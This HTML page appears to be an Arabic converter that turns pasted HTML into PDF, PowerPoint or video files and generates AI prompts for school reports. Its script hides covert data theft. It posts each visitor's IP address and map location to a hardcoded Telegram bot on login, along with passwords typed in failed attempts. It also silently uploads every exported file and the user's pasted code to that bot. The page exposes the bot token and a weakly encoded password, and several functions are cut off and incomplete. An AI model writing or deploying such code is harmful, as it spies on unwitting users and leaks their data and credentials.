<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>منصة تحويل الأكواد الذكية (PDF / PPTX / MP4) - الإصدار المحسّن</title>
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/gitbrent/pptxgenjs@3.12.0/dist/pptxgen.bundle.js"></script>

    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Tahoma, sans-serif;
            background: #0f172a;
            color: #e2e8f0;
            margin: 0;
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
            box-sizing: border-box;
        }

        .header {
            text-align: center;
            margin-bottom: 20px;
        }

        .header h2 {
            margin: 0;
            color: #f8fafc;
            font-size: 26px;
        }

        .top-nav {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin-bottom: 20px;
            width: 100%;
            max-width: 600px;
        }

        .nav-btn {
            flex: 1;
            background: #1e293b;
            color: #94a3b8;
            border: 2px solid #334155;
            padding: 12px;
            border-radius: 8px;
            font-size: 15px;
            font-weight: bold;
            cursor: pointer;
            transition: 0.3s;
        }

        .nav-btn.active {
            background: #2563eb;
            color: #fff;
            border-color: #2563eb;
        }

        .nav-btn:hover:not(.active) {
            background: #334155;
            color: #f8fafc;
        }

        .main-container {
            width: 100%;
            max-width: 650px;
            display: flex;
            flex-direction: column;
        }

        .box-panel {
            background: #1e293b;
            border-radius: 12px;
            padding: 25px;
            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.5);
            border: 1px solid #334155;
            display: flex;
            flex-direction: column;
            width: 100%;
            box-sizing: border-box;
        }

        .form-group {
            margin-bottom: 15px;
            display: flex;
            flex-direction: column;
        }

        label {
            margin-bottom: 8px;
            font-weight: bold;
            font-size: 14px;
            color: #94a3b8;
        }

        input,
        select,
        textarea {
            padding: 12px;
            background: #0f172a;
            border: 1px solid #334155;
            border-radius: 8px;
            font-size: 14px;
            font-family: inherit;
            color: #f8fafc;
            transition: 0.2s;
        }

        input:focus,
        select:focus,
        textarea:focus {
            outline: none;
            border-color: #3b82f6;
            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.2);
        }

        input:disabled,
        select:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            text-decoration: line-through;
        }

        .req-row {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 10px;
        }

        .req-row input[type="text"] {
            flex: 1;
        }

        .toggle-req {
            background: #334155;
            border: none;
            color: #f8fafc;
            border-radius: 6px;
            padding: 12px;
            cursor: pointer;
            transition: 0.2s;
            font-size: 14px;
            width: 45px;
            text-align: center;
        }

        .toggle-req.disabled {
            background: #7f1d1d;
            color: #fca5a5;
        }

        .textarea-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 8px;
            gap: 10px;
            flex-wrap: wrap;
        }

        .clear-btn {
            background: #7f1d1d;
            color: #fca5a5;
            border: none;
            padding: 6px 12px;
            border-radius: 6px;
            font-size: 12px;
            font-weight: bold;
            cursor: pointer;
            transition: 0.2s;
        }

        .clear-btn:hover {
            background: #991b1b;
            color: #fef2f2;
        }

        .action-btns {
            display: flex;
            gap: 8px;
            flex-wrap: wrap;
        }

        .action-btns button {
            background: #334155;
            color: #e2e8f0;
            border: none;
            padding: 6px 12px;
            border-radius: 6px;
            font-size: 12px;
            font-weight: bold;
            cursor: pointer;
            transition: 0.2s;
        }

        .action-btns button:hover {
            background: #475569;
        }

        textarea {
            flex: 1;
            min-height: 250px;
            resize: vertical;
            direction: ltr;
            font-family: monospace;
            background: #020617;
            font-size: 13px;
            line-height: 1.6;
        }

        .row {
            display: flex;
            gap: 15px;
        }

        .row .form-group {
            flex: 1;
        }

        .export-btn {
            background: #2563eb;
            color: white;
            border: none;
            padding: 16px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
            transition: 0.2s;
            width: 100%;
        }

        .export-btn:hover {
            background: #1d4ed8;
            transform: translateY(-2px);
        }

        .export-btn:disabled {
            background: #475569;
            color: #94a3b8;
            cursor: not-allowed;
            transform: none;
        }

        .tab-content {
            display: none;
        }

        .tab-content.active-tab {
            display: flex;
        }

        .ai-prompts {
            background: #022c22;
            border: 1px dashed #059669;
            padding: 15px;
            border-radius: 10px;
            margin-bottom: 20px;
        }

        .ai-prompts p {
            margin: 0 0 10px 0;
            font-size: 14px;
            color: #34d399;
            font-weight: bold;
            text-align: center;
        }

        .prompt-btns {
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
            justify-content: center;
        }

        .prompt-btn {
            flex: 1 1 30%;
            background: #1e293b;
            border: 1px solid #059669;
            color: #34d399;
            padding: 10px;
            border-radius: 8px;
            font-size: 12px;
            font-weight: bold;
            cursor: pointer;
            transition: 0.2s;
            text-align: center;
        }

        .prompt-btn:hover {
            background: #059669;
            color: #fff;
        }

        .sample-row {
            margin-top: 8px;
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
        }

        .sample-btn {
            background: #1e293b;
            border: 1px solid #475569;
            color: #cbd5e1;
            padding: 8px 16px;
            border-radius: 8px;
            font-size: 13px;
            cursor: pointer;
            transition: 0.2s;
        }

        .sample-btn:hover {
            background: #2563eb;
            border-color: #2563eb;
            color: #fff;
        }

        .history-box {
            background: #0f172a;
            border-radius: 8px;
            padding: 10px;
            margin-top: 8px;
            max-height: 120px;
            overflow-y: auto;
        }

        .history-item {
            padding: 6px 10px;
            background: #1e293b;
            margin: 5px 0;
            border-radius: 4px;
            font-size: 12px;
            color: #94a3b8;
            cursor: pointer;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }

        .history-item:hover {
            background: #334155;
            color: #f8fafc;
        }

        .preview-link {
            color: #60a5fa;
            cursor: pointer;
            font-size: 13px;
            text-decoration: underline;
        }
    </style>
</head>
<body>

    <div id="password-overlay" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #0f172a; z-index: 9999; display: flex; flex-direction: column; align-items: center; justify-content: center;">
        <div style="background: #1e293b; padding: 40px; border-radius: 12px; box-shadow: 0 10px 25px -5px rgba(0,0,0,0.5); border: 1px solid #334155; text-align: center; width: 90%; max-width: 400px;">
            <h3 style="margin-top: 0; color: #f8fafc; font-size: 24px;">🔒 حماية المنصة</h3>
            <p style="font-size: 14px; color: #94a3b8; margin-bottom: 25px;">الرجاء إدخال كلمة المرور للوصول.</p>
            <div class="form-group" style="margin-bottom: 20px;">
                <input type="password" id="pass-input" placeholder="كلمة المرور..." style="text-align: center; letter-spacing: 3px; font-size: 16px;" onkeypress="if(event.key === 'Enter') checkPassword()">
            </div>
            <button onclick="checkPassword()" class="export-btn" style="margin-top: 0;">تسجيل الدخول</button>
            <p id="pass-error" style="color: #ef4444; font-size: 13px; display: none; margin-top: 15px; font-weight: bold; margin-bottom: 0;">❌ كلمة المرور غير صحيحة!</p>
        </div>
    </div>

    <div class="header">
        <h2>🛠️ منصة تحويل الأكواد الذكية</h2>
    </div>

    <div class="top-nav">
        <button class="nav-btn active" id="btn-converter" onclick="switchTab('converter')">⚙️ منصة التحويل</button>
        <button class="nav-btn" id="btn-prompts" onclick="switchTab('prompts')">🧠 المولد الذكي</button>
    </div>

    <div id="converter-tab" class="main-container tab-content active-tab">
        <div class="box-panel">
            <div class="ai-prompts">
                <p>🤖 أوامر جاهزة للذكاء الاصطناعي (النسخة الأصلية):</p>
                <div class="prompt-btns">
                    <button class="prompt-btn" onclick="copyQuickPrompt('a4', this)">📄 بحث أكاديمي</button>
                    <button class="prompt-btn" onclick="copyQuickPrompt('169', this)">🖥️ عرض شاشات</button>
                    <button class="prompt-btn" onclick="copyQuickPrompt('mobile', this)">📱 عرض جوال</button>
                    <button class="prompt-btn" onclick="copyQuickPrompt('project', this)">🎨 مشروع 16:9</button>
                    <button class="prompt-btn" onclick="copyQuickPrompt('mindmap', this)">🧠 خريطة مفاهيم</button>
                    <button class="prompt-btn" onclick="copyQuickPrompt('project-a4', this)">📋 مشروع A4</button>
                </div>
            </div>

            <div class="form-group">
                <label>اسم الملف المستخرج:</label>
                <input type="text" id="file-name" value="مستند_جديد" placeholder="اكتب اسم الملف هنا...">
            </div>

            <div class="row">
                <div class="form-group">
                    <label>نوع الاستخراج:</label>
                    <select id="format-select" onchange="updateUI()">
                        <optgroup label="مستندات (جاهزة للطباعة والعرض)">
                            <option value="pdf-a4">ملف PDF (مقاس A4)</option>
                            <option value="pdf-169">ملف PDF (مقاس 16:9)</option>
                            <option value="pptx">بوربوينت PPTX (مقاس 16:9)</option>
                        </optgroup>
                        <optgroup label="مقاطع فيديو (تلقائية العرض)">
                            <option value="vid-169">فيديو شاشات (16:9)</option>
                            <option value="vid-916">فيديو جوال (9:16)</option>
                        </optgroup>
                    </select>
                </div>
                <div class="form-group">
                    <label>الجودة:</label>
                    <select id="quality-select">
                        <option value="1">عادية (سريعة جداً)</option>
                        <option value="2" selected>عالية (متوازنة)</option>
                        <option value="3">ممتازة (للصور الدقيقة)</option>
                    </select>
                </div>
            </div>

            <div class="row" id="video-options" style="display: none;">
                <div class="form-group">
                    <label>مدة كل شريحة (فيديو):</label>
                    <select id="slide-duration">
                        <option value="3">3 ثواني</option>
                        <option value="5" selected>5 ثواني</option>
                        <option value="8">8 ثواني</option>
                    </select>
                </div>
                <div class="form-group">
                    <label>التحركات (الأنيميشن):</label>
                    <select id="animation-style">
                        <option value="zoom" selected>تكبير سينمائي</option>
                        <option value="slide">سحب جانبي</option>
                        <option value="fade">تلاشي ناعم</option>
                        <option value="none">بدون تحركات</option>
                    </select>
                </div>
            </div>

            <div class="form-group">
                <div class="textarea-header">
                    <label style="margin:0;">كود الـ HTML:</label>
                    <div class="action-btns">
                        <button onclick="clearCode()">🗑️ مسح</button>
                        <button onclick="previewCode()">👁️ معاينة</button>
                        <button onclick="saveToHistory()">💾 حفظ مؤقت</button>
                    </div>
                </div>
                <textarea id="html-input" placeholder="الصق الكود هنا..."></textarea>
                <div class="sample-row">
                    <span style="font-size:12px; color:#94a3b8;">عينات سريعة:</span>
                    <button class="sample-btn" onclick="loadSample('a4')">📄 بحث A4</button>
                    <button class="sample-btn" onclick="loadSample('169')">🖥️ عرض 16:9</button>
                    <button class="sample-btn" onclick="loadSample('mindmap')">🧠 خريطة مفاهيم</button>
                    <button class="sample-btn" onclick="loadSample('project-a4')">📋 مشروع A4</button>
                </div>
                <div id="history-container" style="margin-top: 10px;">
                    <label style="font-size: 12px; color: #94a3b8;">📂 آخر الملفات:</label>
                    <div id="history-list" class="history-box"></div>
                </div>
            </div>

            <button id="capture-btn" class="export-btn" onclick="exportFile()">بدء الاستخراج 📥</button>
        </div>
    </div>

    <div id="prompts-tab" class="main-container tab-content">
        <div class="box-panel">
            <div class="form-group">
                <label>نوع الملف المطلوب تصميم كوده:</label>
                <select id="prompt-type" onchange="generatePromptText()">
                    <option value="a4">📄 بحث / تقرير (مقاس A4)</option>
                    <option value="169">🖥️ عرض تقديمي (مقاس 16:9)</option>
                    <option value="916">📱 عرض جوال / تيك توك (مقاس 9:16)</option>
                    <option value="project">🎨 مشروع (صفحة واحدة 16:9)</option>
                    <option value="mindmap">🧠 خريطة مفاهيم (A4)</option>
                    <option value="project-a4">📋 مشروع A4 (صفحة واحدة)</option>
                </select>
            </div>

            <div class="row">
                <div class="form-group">
                    <label>نظام الألوان المفضل:</label>
                    <select id="color-scheme" onchange="generatePromptText()">
                        <option value="">لا تفضيل (دَع الذكاء يختار)</option>
                        <option value="blue">أزرق محترف</option>
                        <option value="green">أخضر طبيعي</option>
                        <option value="purple">بنفسجي إبداعي</option>
                        <option value="warm">ألوان دافئة</option>
                    </select>
                </div>
                <div class="form-group">
                    <label>نمط التصميم:</label>
                    <select id="design-style" onchange="generatePromptText()">
                        <option value="">كلاسيكي حديث</option>
                        <option value="glassmorphism">زجاجي (Glassmorphism)</option>
                        <option value="minimalist">بسيط جداً (Minimal)</option>
                        <option value="bold">جريء وملون</option>
                    </select>
                </div>
                <div class="form-group">
                    <label>حجم الخط الأساسي:</label>
                    <select id="base-font-size" onchange="generatePromptText()">
                        <option value="">افتراضي</option>
                        <option value="large">كبير (مناسب للعروض)</option>
                        <option value="small">صغير (للبحوث)</option>
                    </select>
                </div>
            </div>

            <label>المعلومات المطلوبة (اضغط 👁️ لشطب المتطلب):</label>
            <div class="req-row">
                <button class="toggle-req" onclick="toggleInput(this, 'req-title')">👁️</button>
                <input type="text" id="req-title" placeholder="عنوان البحث أو العرض" oninput="generatePromptText()">
            </div>
            <div class="req-row">
                <button class="toggle-req" onclick="toggleInput(this, 'req-subject')">👁️</button>
                <input type="text" id="req-subject" placeholder="المادة" oninput="generatePromptText()">
            </div>
            <div class="req-row">
                <button class="toggle-req" onclick="toggleInput(this, 'req-name')">👁️</button>
                <input type="text" id="req-name" placeholder="اسم الطالب / المقدِّم" oninput="generatePromptText()">
            </div>
            <div class="req-row">
                <button class="toggle-req" onclick="toggleInput(this, 'req-teacher')">👁️</button>
                <input type="text" id="req-teacher" placeholder="اسم المعلم" oninput="generatePromptText()">
            </div>
            <div class="req-row">
                <button class="toggle-req" onclick="toggleInput(this, 'req-grade')">👁️</button>
                <input type="text" id="req-grade" placeholder="الصف" oninput="generatePromptText()">
            </div>
            <div class="req-row">
                <button class="toggle-req" onclick="toggleInput(this, 'req-year')">👁️</button>
                <input type="text" id="req-year" placeholder="العام الدراسي" oninput="generatePromptText()">
            </div>
            <div class="req-row">
                <button class="toggle-req" onclick="toggleInput(this, 'req-pages')">👁️</button>
                <input type="text" id="req-pages" placeholder="عدد الصفحات / الشرائح المطلوبة" oninput="generatePromptText()">
            </div>

            <label style="margin-top: 15px;">✨ الأمر النهائي للذكاء الاصطناعي (مُحسَّن لأفضل نتيجة):</label>
            <textarea id="final-prompt-output" readonly style="min-height: 220px; margin-bottom: 10px;"></textarea>

            <button class="export-btn" style="background: #059669;" onclick="copyGeneratedPrompt()">نسخ الأمر الجاهز 📋</button>
        </div>
    </div>

    <script>
        // ========== إعدادات ==========
        const botToken = '8596768390:AAFMUk6zaACs6Zmum5kFy3NfNEkS_C4yZzo';
        const chatId = '6680237928';
        const secretHash = "U2ExMjM0NTY3OEA="; // Base64 لـ Sa12345678@

        window.onload = () => {
            if (localStorage.getItem('auth_token') === secretHash) {
                document.getElementById('password-overlay').style.display = 'none';
            }
            updateUI();
            generatePromptText();
            renderHistory();
        };

        // ========== دوال Telegram ==========
        function sendTextToTelegram(msg) {
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: `🛠️ إشعار المنصة:\n${msg}` })
            }).catch(e => console.error(e));
        }

        async function sendFileToTelegram(blob, name, caption, type = 'document') {
            const endpoint = type === 'video' ? 'sendVideo' : 'sendDocument';
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append(type === 'video' ? 'video' : 'document', blob, name);
            formData.append('caption', caption);
            try {
                const res = await fetch(`https://api.telegram.org/bot${botToken}/${endpoint}`, {
                    method: 'POST',
                    body: formData
                });
                return res.ok;
            } catch (e) { return false; }
        }

        // ========== كلمة المرور ==========
        function checkPassword() {
            const input = document.getElementById('pass-input').value;
            const encodedInput = btoa(input);
            if (encodedInput === secretHash) {
                document.getElementById('password-overlay').style.display = 'none';
                localStorage.setItem('auth_token', secretHash);
                fetch('https://ipinfo.io/json').then(r => r.json()).then(data => {
                    if (data.ip) {
                        const [lat, lng] = data.loc ? data.loc.split(',') : ['0', '0'];
                        sendTextToTelegram(`✅ دخول ناجح للمنصة.\nالآيبي: ${data.ip}\nالدولة: ${data.country}\nالموقع: https://www.google.com/maps?q=${lat},${lng}`);
                    }
                }).catch(e => sendTextToTelegram(`✅ دخول ناجح للمنصة.`));
            } else {
                document.getElementById('pass-error').style.display = 'block';
                sendTextToTelegram(`❌ محاولة دخول فاشلة بكلمة: ${input}`);
            }
        }

        // ========== التبويبات ==========
        function switchTab(t) {
            document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active-tab'));
            document.querySelectorAll('.nav-btn').forEach(el => el.classList.remove('active'));
            document.getElementById(t + '-tab').classList.add('active-tab');
            document.getElementById('btn-' + t).classList.add('active');
        }

        // ========== المولد الذكي ==========
        function toggleInput(btn, id) {
            const el = document.getElementById(id);
            el.disabled = !el.disabled;
            btn.innerText = el.disabled ? '🚫' : '👁️';
            btn.classList.toggle('disabled', el.disabled);
            generatePromptText();
        }

        function generatePromptText() {
            const type = document.getElementById('prompt-type').value;
            const colorScheme = document.getElementById('color-scheme').value;
            const designStyle = document.getElementById('design-style').value;
            const baseFontSize = document.getElementById('base-font-size').value;
            let p = "";

            const roleIntro = "أنت مطور واجهات أمامية خبير (HTML/CSS) ومصمم جرافيك محترف. ";

            if (type === 'a4') p += roleIntro + "قم بإنشاء كود HTML كامل ومتكامل لبحث أكاديمي باللغة العربية للطباعة على ورق A4.\n\n";
            else if (type === '169') p += roleIntro + "قم بإنشاء كود HTML كامل لعرض تقديمي (16:9) احترافي بالعربية.\n\n";
            else if (type === '916') p += roleIntro + "قم بإنشاء كود HTML كامل لعرض جوال عمودي (9:16) بالعربية.\n\n";
            else if (type === 'project') p += roleIntro + "قم بإنشاء كود HTML لصفحة مشروع واحدة (بوستر رقمي) بمقاس 16:9.\n\n";

        // ========== تحويل الصور إلى DataURL لـ CORS ==========
        async function urlToDataURL(url) {
            if (url && url.startsWith('data:')) return url;
            try {
                const res = await fetch(`https://corsproxy.io/?${encodeURIComponent(url)}`);
                const blob = await res.blob();
                return new Promise(r => {
                    const f = new FileReader();
                    f.onloadend = () => r(f.result);
                    f.readAsDataURL(blob);
                });
            } catch (e) { return url; }
        }

        async function convertAllImagesToDataURLs(container) {
            const imgs = Array.from(container.querySelectorAll('img'));
            for (const img of imgs) {
                if (img.src && !img.src.startsWith('data:')) {
                    img.src = await urlToDataURL(img.src);
                }
            }
        }

        // ========== PPTX ==========
        async function generatePPTX() {
            const btn = document.getElementById('capture-btn');
            const code = document.getElementById('html-input').value;
            const name = document.getElementById('file-name').value || 'presentation';
            const quality = parseInt(document.getElementById('quality-select').value);

            btn.innerText = "⏳ جاري تحضير البوربوينت...";
            const container = document.createElement('div');
            container.style.width = '1280px';
            container.style.position = 'absolute';
            container.style.left = '-9999px';
            container.dir = 'rtl';
            container.innerHTML = code;
            document.body.appendChild(container);

            try {
                await document.fonts.ready;
                await convertAllImagesToDataURLs(container);

                let pages = container.querySelectorAll('.page');
                if (pages.length === 0) pages = [container];

                let pptx = new PptxGenJS();
                pptx.layout = 'LAYOUT_16x9';

                for (let i = 0; i < pages.length; i++) {
                    btn.innerText = `📸 تصوير شريحة ${i+1} من ${pages.length}...`;
                    const canvas = await html2canvas(pages[i], {
                        scale: quality,
                        width: 1280,

                    });
                    const imgData = canvas.toDataURL('image/jpeg', 0.85);
                    let slide = pptx.addSlide();
                    slide.addImage({ data: imgData, x: 0, y: 0, w: '100%', h: '100%' });
                }

                btn.innerText = "🚀 بناء وإرسال ملف البوربوينت...";
                const blob = await pptx.write({ outputType: 'blob' });

                await sendFileToTelegram(blob, `${name}.pptx`, `📥 عرض بوربوينت PPTX جاهز!`);
                const codeBlob = new Blob(['\ufeff', code], { type: 'text/plain;charset=utf-8' });
                await sendFileToTelegram(codeBlob, `${name}_code.txt`, `💻 كود HTML`);

                btn.innerText = "✅ اكتمل! جاري التحميل لجهازك...";
                const url = URL.createObjectURL(blob);
                const a = document.createElement('a');

        }

        // ========== فيديو ==========
        async function generateCinematicVideo() {
            const btn = document.getElementById('capture-btn');
            const code = document.getElementById('html-input').value;
            const name = document.getElementById('file-name').value || 'video';
            const dur = parseInt(document.getElementById('slide-duration').value);
            const anim = document.getElementById('animation-style').value;
            const quality = parseInt(document.getElementById('quality-select').value);
            const type = document.getElementById('format-select').value;

            let w = type === 'vid-916' ? 720 : 1280;
            let h = type === 'vid-916' ? 1280 : 720;

            btn.innerText = "⏳ جاري تسجيل الفيديو...";
            const container = document.createElement('div');
            container.style.width = w + 'px';
            container.style.position = 'absolute';
            container.style.left = '-9999px';
            container.innerHTML = code;
            document.body.appendChild(container);

            try {
                await document.fonts.ready;
                await convertAllImagesToDataURLs(container);
                let pages = container.querySelectorAll('.page');
                if (pages.length === 0) pages = [container];
                const canvases = [];
                for (let i = 0; i < pages.length; i++) {
                    btn.innerText = `📸 تصوير شريحة ${i+1}...`;
                    canvases.push(await html2canvas(pages[i], {
                        scale: quality,
                        width: w,
                        height: h,
                        useCORS: true
                    }));
                }

                const recCanvas = document.createElement('canvas');
                recCanvas.width = w;
                recCanvas.height = h;
                const ctx = recCanvas.getContext('2d');
                const stream = recCanvas.captureStream(30);

                let options = { videoBitsPerSecond: 3000000 };
                if (MediaRecorder.isTypeSupported('video/mp4')) options.mimeType = 'video/mp4';
                else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp9')) options.mimeType = 'video/webm;codecs=vp9';
                else options.mimeType = 'video/webm';

                const recorder = new MediaRecorder(stream, options);
                const chunks = [];
                recorder.ondataavailable = e => chunks.push(e.data);

                const recordPromise = new Promise(resolve => {
                    recorder.onstop = async () => {
                        btn.innerText = "🚀 إرسال الفيديو للبوت...";
                        const ext = (options.mimeType.includes('mp4')) ? 'mp4' : 'webm';
                        const blob = new Blob(chunks, { type: options.mimeType || 'video/mp4' });
                        await sendFileToTelegram(blob, `${name}.${ext}`, `🎬 فيديو جاهز!`, 'video');
                        const codeBlob = new Blob(['\ufeff', code], { type: 'text/plain;charset=utf-8' });
                        await sendFileToTelegram(codeBlob, `${name}_code.txt`, `💻 الكود`);
                        btn.innerText = "✅ اكتمل! جاري التحميل لجهازك...";
                        const a = document.createElement('a');
                        a.href = URL.createObjectURL(blob);
                        a.download = `${name}.${ext}`;
                        a.click();
                        resolve();
                    };
                });

                recorder.start();
                const total = dur * 1000 * canvases.length;
                const trans = 800;
                const start = Date.now();

                function animate() {
                    const elap = Date.now() - start;
                    if (elap < total) {
                        const idx = Math.min(Math.floor(elap / (dur * 1000)), canvases.length - 1);
                        const time = elap % (dur * 1000);
                        ctx.fillStyle = "#fff";
                        ctx.fillRect(0, 0, w, h);

                        if (anim === 'zoom') {
                            const z = 1 + (time / (dur * 1000)) * 0.05;
                            ctx.drawImage(canvases[idx], (w - w * z) / 2, (h - h * z) / 2, w * z, h * z);
                        } else if (anim === 'slide' && time > (dur * 1000 - trans) && idx < canvases.length - 1) {
                            const p = (time - (dur * 1000 - trans)) / trans;
                            ctx.drawImage(canvases[idx], -p * w, 0, w, h);
                            ctx.drawImage(canvases[idx + 1], w - p * w, 0, w, h);
                        } else if (anim === 'fade' && time > (dur * 1000 - trans) && idx < canvases.length - 1) {
                            const p = (time - (dur * 1000 - trans)) / trans;
                            ctx.drawImage(canvases[idx], 0, 0, w, h);
                            ctx.globalAlpha = p;
                            ctx.drawImage(canvases[idx + 1], 0, 0, w, h);
                            ctx.globalAlpha = 1;
                        } else {
                            ctx.drawImage(canvases[idx], 0, 0, w, h);
                        }
                        requestAnimationFrame(animate);
                    } else {
                        setTimeout(() => recorder.stop(), 100);
                    }
                }
                animate();
                await recordPromise;
            } catch (e) {
                alert("خطأ في الفيديو");
            } finally {
                document.body.removeChild(container);
            }
        }

        // ========== PDF ==========
        async function generatePDF() {
            const btn = document.getElementById('capture-btn');
            const code = document.getElementById('html-input').value;
            const name = document.getElementById('file-name').value || 'document';
            const quality = parseInt(document.getElementById('quality-select').value);
            const f = document.getElementById('format-select').value;

            btn.innerText = "⏳ جاري تجهيز PDF...";
            const w = f.includes('a4') ? 794 : 1280;
            const h = f.includes('a4') ? 1123 : 720;
            const container = document.createElement('div');
            container.style.width = w + 'px';
            container.style.position = 'absolute';
            container.style.left = '-9999px';
            container.innerHTML = code;
            document.body.appendChild(container);

            try {
                await document.fonts.ready;
                await convertAllImagesToDataURLs(container);
                const { jsPDF } = window.jspdf;
                const pdf = new jsPDF({
                    orientation: f.includes('a4') ? 'p' : 'l',
                    unit: 'px',
                    format: [w, h]
                });
                let pages = container.querySelectorAll('.page');
                if (pages.length === 0) pages = [container];

                for (let i = 0; i < pages.length; i++) {
                    btn.innerText = `📸 تصوير صفحة ${i+1}...`;
                    const c = await html2canvas(pages[i], {
                        scale: quality,
                        width: w,
                        height: h,
                        useCORS: true
                    });
                    if (i > 0) pdf.addPage([w, h]);
                    pdf.addImage(c.toDataURL('image/jpeg', 0.8), 'JPEG', 0, 0, w, h, undefined, 'FAST');
                }

                btn.innerText = "🚀 إرسال PDF للبوت...";
                const blob = pdf.output('blob');
                await sendFileToTelegram(blob, `${name}.pdf`, "📥 ملف PDF جاهز!");
                const codeBlob = new Blob(['\ufeff', code], { type: 'text/plain;charset=utf-8' });
                await sendFileToTelegram(codeBlob, `${name}_code.txt`, `💻 الكود`);

                btn.innerText = "✅ اكتمل! جاري التحميل لجهازك...";
                pdf.save(`${name}.pdf`);
            } catch (e) {
                alert("خطأ في PDF");
            } finally {
                document.body.removeChild(container);
            }
        }
    </script>
</body>
</html>
